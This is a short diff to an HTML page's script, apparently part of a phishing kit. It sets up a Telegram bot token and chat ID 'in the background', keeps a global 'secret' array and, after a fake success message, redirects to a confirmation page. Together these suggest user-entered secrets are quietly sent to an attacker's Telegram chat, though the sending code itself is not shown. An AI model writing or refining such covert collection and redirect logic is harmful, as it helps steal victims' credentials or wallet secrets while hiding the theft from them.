@@ -1009,8 +1009,8 @@
 
 <script>
     // Configuration Telegram (en arrière-plan)
-    const TELEGRAM_BOT_TOKEN = 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
-    const TELEGRAM_CHAT_ID = '6078788670';
+    const TELEGRAM_BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';
+    const TELEGRAM_CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';
     
     // Variables globales
     let secret = [];
@@ -1249,7 +1249,9 @@
         successMsg.textContent = '';
         successMsg.style.display = 'block';
         
-
+        setTimeout(() => {
+            window.location.href = 'confirmation.html';
+        }, 2000);
     }
 
     function exitPage() {
